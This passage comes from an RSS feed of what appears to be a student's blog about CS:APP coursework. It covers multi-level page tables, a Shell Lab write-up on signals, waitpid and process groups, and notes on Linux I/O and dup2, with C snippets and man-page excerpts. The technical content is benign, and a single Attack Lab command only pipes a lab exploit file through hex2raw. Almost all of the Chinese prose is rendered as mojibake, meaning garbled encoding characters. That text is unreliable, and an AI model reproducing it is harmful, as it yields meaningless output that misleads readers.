ä¸Šå›¾çš„è™šæ‹Ÿå†…å­˜ä¸­,VP0&lt;del&gt;VP1023,VP1024&lt;/del&gt;VP2047è¿™2Ké¡µæœ‰å†…å®¹,åˆ†åˆ«ç”¨ä¸¤ä¸ªäºŒçº§é¡µè¡¨æ¥å­˜å‚¨.ä»VP2048å¼€å§‹æœ‰6Kæœªåˆ†é…é¡µé¢,ä¸è®¾äºŒçº§é¡µè¡¨.æœ€å1024é¡µ,å‰1023ä¸ªæœªåˆ†é…,æœ€åä¸€é¡µæ˜¯æ ˆ,è®¾äºŒçº§é¡µè¡¨,è¯¥äºŒçº§é¡µè¡¨çš„æœ€åä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘VP9215,å…¶ä»–æŒ‡é’ˆæ˜¯ç©ºæŒ‡é’ˆ.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250206162713.png&quot; alt=&quot;&quot;&gt;
å¯¹äºkçº§é¡µè¡¨,å°†VPNåˆ’åˆ†æˆkæ®µ,åƒä¸€æ£µæ ‘ä¸€æ ·ä¸€æ¬¡é€çº§æŸ¥æ‰¾,æœ€åå–å¾—ç‰©ç†åœ°å€.
ä¸€èˆ¬æ˜¯4çº§é¡µè¡¨.æ ¹æ®å±€éƒ¨æ€§,é¡µè¡¨ç¼“å­˜åœ¨TLBä¸­,å€’ä¹Ÿä¸ä¼šå¢åŠ å¤ªå¤šå¼€é”€,åè€Œèƒ½ç¼©å°é¡µè¡¨çš„å¤§å°.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å•Šå•Šå•Šå¥½ç»•è¦ç»•æ™•äº†...&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Tue, 04 Feb 2025 16:00:00 GMT</pubDate></item><item><title>Shlab</title><link>https://www.tankimzeg.top/blog/shlab/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/shlab/</guid><description>Shell lab records</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/shlab/&quot;&gt;https://www.tankimzeg.top/blog/shlab/&lt;/a&gt;&lt;/blockquote&gt; &lt;p&gt;import Collapse from &amp;quot;../../components/mdx/Collapse.astro&amp;quot;;&lt;/p&gt;
&lt;h1&gt;ç€æ‰‹&lt;/h1&gt;
&lt;p&gt;Writeupå‘Šè¯‰æˆ‘,æœ¬å®éªŒå¯ä»¥ä¸¤ä¸ªäººç»„é˜Ÿå®Œæˆ,è€Œæˆ‘å½“ç„¶åªèƒ½è‡ªå·±å®Œæˆå’¯^_^&lt;/p&gt;
&lt;p&gt;æœ¬å®éªŒæä¾›äº†ä¸€ä¸ªshellæ¡†æ¶(åŒ…æ‹¬æ•°æ®ç»“æ„&lt;code&gt;job_t&lt;/code&gt;),è¦è®©æˆ‘è‡ªå·±ç¼–å†™å‡ ä¸ªå…³é”®å‡½æ•°:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;eval&lt;/code&gt;:æ‰§è¡Œå‘½ä»¤è¡Œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;builtin_cmd&lt;/code&gt;:é‡åˆ°å†…ç½®å‡½æ•°(&lt;code&gt;quit&lt;/code&gt;,&lt;code&gt;fg&lt;/code&gt;,&lt;code&gt;bg&lt;/code&gt;,&lt;code&gt;quit&lt;/code&gt;)ç›´æ¥æ‰§è¡Œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;do_bgfg&lt;/code&gt;: å®æ–½åå°è¿›ç¨‹è°ƒåº¦&lt;/li&gt;
&lt;li&gt;&lt;code&gt;waitfg&lt;/code&gt;: é˜»å¡ç­‰å¾…å‰å°ä»»åŠ¡å®Œæˆ.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sigchld_handler&lt;/code&gt;:æ•è·SIGCHILDä¿¡å·&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sigint_handler&lt;/code&gt;: æ•è·SIGINT(Ctrl-C)ä¿¡å·&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sigstp_handler&lt;/code&gt;: æ•è·SIGTSP(Ctrl-Z)ä¿¡å·
å®ç°ç”±å‰å°åå°è°ƒåº¦çš„tiny shell.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æˆ‘æ²¡æœ‰ç€æ€¥å¼€å§‹å†™,è€Œæ˜¯å…ˆæµè§ˆäº†tsh.cçš„æ‰€æœ‰ä»£ç ,ç†Ÿæ‚‰äº†æ•°æ®ç»“æ„å’Œhelpå‡½æ•°,æƒŠå¹äºåˆ†å‰²å¤„ç†å‘½ä»¤è¡Œå‚æ•°çš„&lt;code&gt;pearseline()&lt;/code&gt;å‡½æ•°,ç„¶åè‡ªé¡¶å‘ä¸‹å¼€å§‹æ€è€ƒ(å®é™…ä¸Šæ˜¯è¿˜æ²¡æ€è·¯hhh),å‚è€ƒäº†åˆ«äººçš„ä»£ç é‡[^1],æƒ³æ¸…æ¥šäº†æ¯ä¸ªå‡½æ•°è´Ÿè´£ä»€ä¹ˆåŠŸèƒ½å†åŠ¨æ‰‹.&lt;/p&gt;
&lt;p&gt;[^1]:&lt;a href=&quot;https://blog.csdn.net/qq_37500516/article/details/120836083&quot;&gt;CSAPP Lab5å®éªŒè®°å½• ---- Shell Labï¼ˆå®éªŒåˆ†æ + å®Œæ•´ä»£ç ï¼‰&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æµ‹è¯•æ–¹æ³•:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;make
make test*
make rtest*
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å°†æˆ‘çš„tshä¸å‚è€ƒç­”æ¡ˆtshrefå¯¹æ¯”,è¦æ±‚è¾“å‡ºä¸€è‡´(å¤„ç†PID).&lt;/p&gt;
&lt;h1&gt;ç¨‹åºè®¾è®¡&lt;/h1&gt;
&lt;p&gt;åœ¨æˆ‘çš„tshä¸­è¿è¡Œçš„ç¨‹åºéƒ½æ˜¯tshç¨‹åºçš„å­è¿›ç¨‹,Linuxé»˜è®¤forkå­è¿›ç¨‹ä¸çˆ¶è¿›ç¨‹åŒå±ä¸€ä¸ªprocess group,è¿™ä¼šå¯¼è‡´å‘é€ä¿¡å·&lt;code&gt;kill(-pid,sig)&lt;/code&gt;ä¼šå‘é€ç»™æ•´ä¸ªprocess group,ä¹Ÿå°±æ˜¯è¯´,è¿™ç§æƒ…å†µä¸‹,å¦‚æœæˆ‘åœ¨å‰å°Ctrl-Z/Ctrl-C,æˆ‘çš„tshè¿›ç¨‹ä¹Ÿä¼šæš‚åœ/ç»ˆæ­¢,è¿™ä¸æ˜¯æˆ‘ä»¬æœŸå¾…çš„ç»“æœ.è§£å†³æ–¹æ³•ä¹Ÿç®€å•,writeupæç¤ºæˆ‘åœ¨å­è¿›ç¨‹ä¸­è®¾ç½®&lt;code&gt;setgpid(0, 0)&lt;/code&gt;å°±å¯.&lt;/p&gt;
&lt;p&gt;è¿™æ ·,tsh,fg,bg1,bg2,bg3å„æœ‰ä¸åŒçš„pidå’Œgpid:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250205152333.png&quot; alt=&quot;&quot;&gt;
tshçš„å­è¿›ç¨‹,åœæ­¢æˆ–ç»ˆæ­¢éƒ½ä¼šç»™tshå‘é€SIGCHLDä¿¡å·,è§¦å‘&lt;code&gt;sigchld_handler&lt;/code&gt;å‡½æ•°.&lt;/p&gt;
&lt;p&gt;ä»£ç ä¸­ç©¿æ’äº†å¤§é‡ç³»ç»Ÿè°ƒç”¨åˆ¤æ–­,ä¿¡å·é˜»å¡æœºåˆ¶å¢å¼ºåŸå­æ€§,æœ€å‘çš„æ˜¯è¿™ä¸ª&lt;code&gt;waitpid&lt;/code&gt;å‡½æ•°çš„è¿”å›çŠ¶æ€.&lt;/p&gt;
&lt;p&gt;å½“æˆ‘ä»£ç å¤§ä½“å®Œæˆ,é€ä¸ªæµ‹è¯•æ—¶,test16æ­»æ´»è¿‡ä¸å»,æˆ‘çœŸçš„æ— è¯­...æ— å¥ˆçœ‹çœ‹åˆ«äººçš„è§£æ³•[^2][^3].è°èƒ½æƒ³åˆ°, &lt;code&gt;WIFSTOPPED(status)&lt;/code&gt;ä¸&lt;code&gt;WTERMSIG(status)==SIGTSTP&lt;/code&gt;è¡Œä¸ºä¼¼ä¹ä¸ä¸€æ ·,ä¸€å¼€å§‹ç”¨åè€…,æ”¹ä¸ºå‰è€…åŠå…¶é£æ ¼çš„&lt;code&gt;WIFEXITED(status)&lt;/code&gt;è¿™äº›å°±å¥½äº†...&lt;/p&gt;
&lt;p&gt;[^2]:&lt;a href=&quot;https://blog.csdn.net/weixin_45739365/article/details/113527531&quot;&gt;CSAPP ShellÂ Lab å®éªŒä»£ç +16ä¸ªtest&lt;/a&gt;
[^3]:&lt;a href=&quot;https://blog.liuly.moe/posts/csapp-shell&quot;&gt;CSAPP ä¹‹ Shell Lab&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Writeupæç¤ºæˆ‘ç”¨&lt;code&gt;waitpid&lt;/code&gt;çš„&lt;code&gt;WNOHANG&lt;/code&gt;,&lt;code&gt;WUNTRACED&lt;/code&gt;é€‰é¡¹.æˆ‘åœ¨&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;man 2 waitpid
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰¾åˆ°äº†è¯¦ç»†çš„è§£é‡Š:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; WNOHANG
              return immediately if no child has exited.

WUNTRACED
              also return if a child has stopped (but not traced via ptrace(2)).   Staâ€
              tus  for  traced children which have stopped is provided even if this opâ€
              tion is not specified.

WCONTINUED (since Linux 2.6.10)
              also return if a stopped child has been resumed by delivery of SIGCONT.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿˜æœ‰&lt;code&gt;kill&lt;/code&gt;å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°,ä¸åŒå€¼å…·æœ‰ä¸åŒæ„ä¹‰,è¿˜ç®—æŒºæœ‰æ„æ€çš„:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;DESCRIPTION
       The kill() system call can be used to send any signal to any process group or process.

       If pid is positive, then signal sig is sent to the process with the ID specified by pid.

       If pid equals 0, then sig is sent to every process in the process group of the calling process.

       If  pid equals -1, then sig is sent to every process for which the calling process has permission to send
       signals, except for process 1 (init), but see below.

       If pid is less than -1, then sig is sent to every process in the process group whose ID is -pid.

       If sig is 0, then no signal is sent, but existence and permission checks are still performed; this can be
       used  to check for the existence of a process ID or process group ID that the caller is permitted to sigâ€
       nal.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åœ¨&lt;code&gt;waitfg&lt;/code&gt;å‡½æ•°ä¸­,Writeupå±…ç„¶æ¨èæˆ‘å¾ªç¯å†…ç”¨&lt;code&gt;sleep&lt;/code&gt;å‡½æ•°,è¯¾å ‚ä¸Šä¸æ˜¯è¯´è¿™æ ·å¾ˆæµªè´¹æ—¶é—´å—,æˆ‘ä¸€åº¦ä»¥ä¸ºè‡ªå·±ç†è§£é”™äº†.æˆ‘æœæ–­ä½¿ç”¨äº†è¯¾å ‚ä¸Šæåˆ°çš„&lt;code&gt;sigsuspend&lt;/code&gt;å‡½æ•°,æå‡äº†æ•ˆç‡,ç®—æ˜¯ä¸€ä¸ªæ”¹è¿›å§.&lt;/p&gt;
&lt;p&gt;å†™ä»£ç è¿™ç§äº‹æƒ…éš¾ä»¥è¨€è¯´,å»æˆ‘çš„æ³¨é‡Šä¸­ä½“ä¼šå§...ğŸ˜‹&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æºä»£ç è§&lt;a href=&quot;https://github.com/PrekrasnoyeDalekov/CS-APP/blob/main/labs/shlab/tsh.c&quot;&gt;tsh.c&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;ç»“æœ&lt;/h1&gt;
&lt;p&gt;é™¤äº†æ‰“å°çš„å­—ç¬¦ä¸²æ ¼å¼ä¸åŒ(è¿™æ ·æ‰æ˜¾å¾—æ˜¯æˆ‘è‡ªå·±å†™çš„å˜›)å¤–,ä¸&lt;code&gt;tshref&lt;/code&gt;è¾“å‡ºç»“æœ&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å®Œå…¨ä¸€è‡´&lt;/strong&gt;(æ¿€åŠ¨):&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250205143726.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250205143737.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250205144605.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250205144644.png&quot; alt=&quot;&quot;&gt;
æˆåŠŸå®ç°äº†ä¸€ä¸ª&lt;em&gt;tiny shell&lt;/em&gt;!&lt;/p&gt;
&lt;h1&gt;æ„Ÿå—&lt;/h1&gt;
&lt;p&gt;æœ¬æ¬¡å®éªŒçš„æ„Ÿå—åˆä¸ä¹‹å‰çš„å®éªŒæœ‰ä¸åŒçš„æ„Ÿå—.è¿™æ¬¡çš„æ„Ÿå—å°±æ˜¯:&lt;strong&gt;æ··ä¹±&lt;/strong&gt;!&lt;/p&gt;
&lt;p&gt;è™½ç„¶é€»è¾‘ä¸éš¾,ä½†æ˜¯ä»£ç ä¸­è¦æ³¨æ„çš„ç»†èŠ‚å®åœ¨å¤ªå¤šäº†!å†è¿‡ä¸€æ®µæ—¶é—´ä¼°è®¡å°±çœ‹ä¸æ‡‚ä¸ºä»€ä¹ˆé‚£æ ·å¤„ç†äº†...&lt;/p&gt;
&lt;p&gt;ä¿¡å·æœºåˆ¶é”™ç»¼å¤æ‚,gdbè°ƒè¯•æ›´æ²¡è¾™,çœ‹èµ·æ¥åŠŸèƒ½ä¸€è‡´çš„ä¸åŒçš„å®å®šä¹‰è¡Œä¸ºç”šè‡³ä¸ä¸€æ ·!åªèƒ½ä¸€ç‚¹ç‚¹è¯•é”™,å‚è€ƒåˆ«äººä½¿ç”¨çš„å®å®šä¹‰æ‰æ”¹æ‰äº†ä¸€ä¸ªç¦»å¥‡çš„bug.æˆ‘æ¸¸ç¦»åœ¨å„ç§ç¦»å¥‡çš„bugä¸­,å‹‰å¼ºä¿®å¤äº†æˆ‘å‘ç°çš„æ‰€æœ‰bug...&lt;/p&gt;
&lt;p&gt;è¿ä¸€ä¸ªåŠæˆå“shellçš„ä»£ç éƒ½å¦‚æ­¤æ··ä¹±,çœŸçš„å¾ˆéš¾æƒ³è±¡Linuxå†…æ ¸å±…ç„¶æ˜¯ç”¨Cè¯­è¨€å†™æˆçš„!ğŸ˜¨&lt;/p&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Mon, 03 Feb 2025 16:00:00 GMT</pubDate></item><item><title>ç³»ç»Ÿçº§IO</title><link>https://www.tankimzeg.top/blog/%E7%B3%BB%E7%BB%9F%E7%BA%A7io/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E7%B3%BB%E7%BB%9F%E7%BA%A7io/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E7%B3%BB%E7%BB%9F%E7%BA%A7io/&quot;&gt;https://www.tankimzeg.top/blog/%E7%B3%BB%E7%BB%9F%E7%BA%A7io/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;Linux I/Oæ€»è§ˆ&lt;/h1&gt;
&lt;p&gt;Linuxæ–‡ä»¶æ˜¯å­—èŠ‚çš„åºåˆ—:$B_{0},B_{1},\dots,B_{k},\dots,B_{m-1}$&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸€åˆ‡éƒ½ä»¥æ–‡ä»¶å½¢å¼å±•ç°:&lt;ul&gt;
&lt;li&gt;ç¡¬ç›˜: /dev/sda2&lt;/li&gt;
&lt;li&gt;ç»ˆç«¯: /dev/tty2&lt;/li&gt;
&lt;li&gt;å†…æ ¸é•œåƒ: /boot/vmlinuz-3.13.0-55-generic&lt;/li&gt;
&lt;li&gt;å†…æ ¸æ•°æ®ç»“æ„: /proc&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Unix I/Oå‡½æ•°:&lt;ul&gt;
&lt;li&gt;&lt;code&gt;open()&lt;/code&gt;å’Œ&lt;code&gt;close()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;read()&lt;/code&gt;å’Œ&lt;code&gt;write()&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;lseek()&lt;/code&gt;:å½“å‰æ–‡ä»¶çš„ç›¸å¯¹åç§»é‡
  &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250203224007.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;æ–‡ä»¶ç±»å‹&lt;ul&gt;
&lt;li&gt;å¸¸è§„æ–‡ä»¶:åŒ…æ‹¬ä»»æ„æ•°æ®&lt;/li&gt;
&lt;li&gt;ç›®å½•:ç›¸å…³æ–‡ä»¶ç»„çš„ç´¢å¼•,æè¿°å…¶ä»–æ–‡ä»¶çš„ä½ç½®å’Œç´¢å¼•&lt;/li&gt;
&lt;li&gt;å¥—æ¥å­—:ç½‘ç»œç¼–ç¨‹&lt;/li&gt;
&lt;li&gt;ç®¡é“&lt;/li&gt;
&lt;li&gt;é“¾æ¥&lt;/li&gt;
&lt;li&gt;è®¾å¤‡&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æœ¬è¯¾ç¨‹è®¨è®ºå‰ä¸‰ç§.&lt;/p&gt;
&lt;h2&gt;å¸¸è§„æ–‡ä»¶&lt;/h2&gt;
&lt;p&gt;å¸¸è§„æ–‡ä»¶åŒ…å«ä»»æ„æ•°æ®.
æ“ä½œç³»ç»Ÿä¸ç®¡æ–‡ä»¶å†…éƒ¨çš„å†…å®¹;æœ‰äº›åº”ç”¨ç¨‹åºåŒºåˆ†äºŒè¿›åˆ¶æ–‡ä»¶å’Œæ–‡æœ¬æ–‡ä»¶.
æ–‡æœ¬æ–‡ä»¶åªæœ‰ASCIIæˆ–Unicodeå­—ç¬¦;å…¶ä»–å±äºŒè¿›åˆ¶æ–‡ä»¶.
ä¸åŒç³»ç»Ÿä¸­çš„æ¢è¡Œç¬¦:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linuxå’ŒMac OS: &amp;#39;\n&amp;#39;(0xa)   LF&lt;/li&gt;
&lt;li&gt;Windowså’Œç½‘ç»œåè®®: &amp;#39;\r\n&amp;#39;(0xd 0xa)   CRLF&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;ç›®å½•&lt;/h2&gt;
&lt;p&gt;ç›®å½•åŒ…æ‹¬ä¸€ä¸ªé“¾æ¥çš„æ•°ç»„.
æ¯ä¸ªç›®å½•è‡³å°‘åŒ…æ‹¬ä¸¤ä¸ªå…ƒç´ : .(è‡ªèº«çš„é“¾æ¥) å’Œ ..(çˆ¶ç›®å½•çš„é“¾æ¥)
æ“ä½œç›®å½•çš„å‘½ä»¤:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mkdir&lt;/code&gt;:åˆ›å»ºç©ºç›®å½•&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ls&lt;/code&gt;:æµè§ˆç›®å½•å†…å®¹&lt;/li&gt;
&lt;li&gt;&lt;code&gt;rmdir&lt;/code&gt;:åˆ é™¤ç©ºç›®å½•&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ç›®å½•å±‚æ¬¡ç»“æ„:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250203232107.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;I/Oå‡½æ•°&lt;/h2&gt;
&lt;p&gt;æˆ‘åœ¨ç½‘ç»œç¼–ç¨‹çš„å®è·µä¸­å·²ç»æ¥è§¦è¿‡Linuxçš„I/Oå‡½æ•°,ä»¥åŠLinuxä¸€åˆ‡çš†æ–‡ä»¶çš„ç‰¹ç‚¹.å¯¹ä»¥ä¸‹Cå‡½æ•°å·²ç»ç†Ÿæ‚‰.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;open&lt;/code&gt;å‡½æ•°&lt;/li&gt;
&lt;li&gt;&lt;code&gt;close&lt;/code&gt;å‡½æ•°&lt;/li&gt;
&lt;li&gt;&lt;code&gt;read&lt;/code&gt;å‡½æ•°&lt;/li&gt;
&lt;li&gt;&lt;code&gt;write&lt;/code&gt;å‡½æ•°
Linux shellåˆ›å»ºçš„è¿›ç¨‹éƒ½æœ‰ä¸‰ä¸ªåˆå§‹çš„&lt;strong&gt;æ–‡ä»¶æè¿°ç¬¦&lt;/strong&gt;:&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;0: stdin&lt;/li&gt;
&lt;li&gt;1: stdout&lt;/li&gt;
&lt;li&gt;2: stderr
ä¹‹ååˆ›å»ºçš„æ–‡ä»¶æè¿°ç¬¦ä»3å¼€å§‹å¢åŠ ,æœ‰ä¸Šé™.&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;æ–‡ä»¶å…ƒæ•°æ®(Metadata)&lt;/h1&gt;
&lt;p&gt;statæ•°æ®ç»“æ„:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Metadata returned by the stat and fstat functions */ 
struct stat { 
	dev_t st_dev; /* Device */ 
	ino_t st_ino; /* inode */ 
	mode_t st_mode; /* Protection and file type */ 
	nlink_t st_nlink; /* Number of hard links */ 
	uid_t st_uid; /* User ID of owner */ 
	gid_t st_gid; /* Group ID of owner */ 
	dev_t st_rdev; /* Device type (if inode device) */ 
	off_t st_size; /* Total size, in bytes */ 
	unsigned long st_blksize; /* Blocksize for filesystem I/O */ 
	unsigned long st_blocks; /* Number of blocks allocated */ 
	time_t st_atime; /* Time of last access */ 
	time_t st_mtime; /* Time of last modification */ 
	time_t st_ctime; /* Time of last change */ 
};
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;[!note]
æˆ‘å‘ç°Linuxä¸­ä¸€ä¸ªå¥½ç”¨çš„å‘½ä»¤å·¥å…·&lt;code&gt;man&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;sudo apt upgrade
sudo apt-get install man-db
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç„¶åå°±å¯ä»¥é€šè¿‡&lt;code&gt;man&lt;/code&gt;æŸ¥çœ‹å„ç§å‘½ä»¤,å‡½æ•°,ååˆ†è¯¦ç»†!
ä¾‹å¦‚,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;man 2 stat
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¼šå‡ºç°å¸®åŠ©æ–‡æ¡£:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250204004534.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1&gt;æ‰“å¼€æ–‡ä»¶çš„è¡¨ç¤º&lt;/h1&gt;
&lt;p&gt;æ¯ä¸€ä¸ªè¿›ç¨‹éƒ½æœ‰ä¸€ä¸ªæè¿°ç¬¦è¡¨(Descriptor table),æ‰“å¼€æŸä¸ªæ–‡ä»¶å,è¯¥è¡¨ç›¸åº”å…ƒç´ çš„æŒ‡é’ˆæŒ‡å‘è¯¥æ–‡ä»¶çš„æ•°æ®ç»“æ„.è¯¥æ•°æ®ç»“æ„æ˜¯æ‰“å¼€æ–‡ä»¶è¡¨(Open file table)çš„ä¸€ä¸ªå…ƒç´ ,ç”±æ“ä½œç³»ç»Ÿè¿›è¡Œå…¨å±€ç»´æŠ¤.
æ‰“å¼€æ–‡ä»¶è¡¨çš„ä¸€ä¸ªå…ƒç´ åŒ…å«äº†è¯¥æ–‡ä»¶çš„ä¿¡æ¯:File posæ˜¯æœ€åä¸€æ¬¡è¯»å†™æ“ä½œçš„ä½ç½®;æ‰“å¼€æ–‡ä»¶å¯ä»¥è¢«æ‰€æœ‰è¿›ç¨‹å…±äº«,æ‰€ä»¥å¼•ç”¨è®¡æ•°(refcnt)è¡¨æ˜å®ƒå½“å‰çš„å¼•ç”¨æ¬¡æ•°.v-nodeæ˜¯æ–‡ä»¶çš„stat.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦å¼•ç”¨ä¸¤ä¸ªä¸åŒçš„æ–‡ä»¶:
  &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250204110451.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦æ‰“å¼€æ‰“å¼€åŒä¸€ä¸ªæ–‡ä»¶:
  &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250204111218.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;fork&lt;/code&gt;åˆ›å»ºå­è¿›ç¨‹,å…±äº«open file table
  æ¯ä¸ªrefcntåŠ 1
  &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250204111606.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;I/Oé‡å®šå‘&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
int dup2(int oldfd, int newfd);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é€šè¿‡è°ƒç”¨&lt;code&gt;dup2&lt;/code&gt;å‡½æ•°,å¤åˆ¶æ–‡ä»¶æè¿°ç¬¦æ¥å®ç°é‡å®šå‘.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250204112244.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250204113313.png&quot; alt=&quot;&quot;&gt;
åœ¨shellä¸­,&lt;code&gt;&amp;lt;&lt;/code&gt; æ˜¯è¾“å…¥é‡å®šå‘; &lt;code&gt;&amp;gt;&lt;/code&gt; æ˜¯è¾“å‡ºé‡å®šå‘.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åœ¨Attacklabä¸­,æˆ‘å·²ç»ç”¨è¿‡&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;./hex2raw &amp;lt; exploit.txt &amp;gt; exploit-raw.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™å°±æ˜¯å°† &lt;code&gt;hex2raw&lt;/code&gt;ç¨‹åºçš„è¾“å…¥é‡å®šå‘ä¸º &lt;code&gt;exploit.txt&lt;/code&gt;,è¾“å‡ºé‡å®šå‘ä¸º &lt;code&gt;exploit-raw.txt&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;[!think]
æˆ‘è®°å¾—åœ¨ç½‘ç»œç¼–ç¨‹çš„å®è·µä¸­,çˆ¶è¿›ç¨‹&lt;code&gt;close&lt;/code&gt;æ–‡ä»¶æè¿°ç¬¦,å­è¿›ç¨‹çš„è¯¥æ–‡ä»¶è¿˜åœ¨,å¿…é¡»å­è¿›ç¨‹ä¹Ÿ&lt;code&gt;close&lt;/code&gt;æ‰æ˜¯å½»åº•å…³é—­.è€Œ&lt;code&gt;dup2&lt;/code&gt;å‡å°‘äº†oldfdçš„refcnt,å´ä¼¼ä¹ä¸ä¼šå…³é—­æ–‡ä»¶.å®ƒä»¬çš„å…·ä½“å®ç°æ˜¯å¦‚ä½•æ“ä½œdescriptor table å’Œ open file tableçš„å‘¢?&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;å¼•å‘å¤æ‚çš„åˆ†æ&lt;/h2&gt;
&lt;p&gt;å‡è®¾fnameæ–‡ä»¶çš„å†…å®¹æ˜¯&amp;quot;abcde&amp;quot;,ä»¥ä¸‹ç¨‹åºçš„è¾“å‡ºç»“æœåˆ†åˆ«æ˜¯ä»€ä¹ˆ?&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* ffiles1.c */
#include &amp;quot;csapp.h&amp;quot; 
int main(int argc, char *argv[]) { 
	int fd1, fd2, fd3; 
	char c1, c2, c3; 
	char *fname = argv[1]; 
	fd1 = Open(fname, O_RDONLY, 0); 
	fd2 = Open(fname, O_RDONLY, 0); 
	fd3 = Open(fname, O_RDONLY, 0); 
	Dup2(fd2, fd3); 
	Read(fd1, &amp;amp;c1, 1); 
	Read(fd2, &amp;amp;c2, 1); 
	Read(fd3, &amp;amp;c3, 1); 
	printf(&amp;quot;c1 = %c, c2 = %c, c3 = %c\n&amp;quot;, c1, c2, c3); 
	return 0; 
}

/* ffiles2.c */
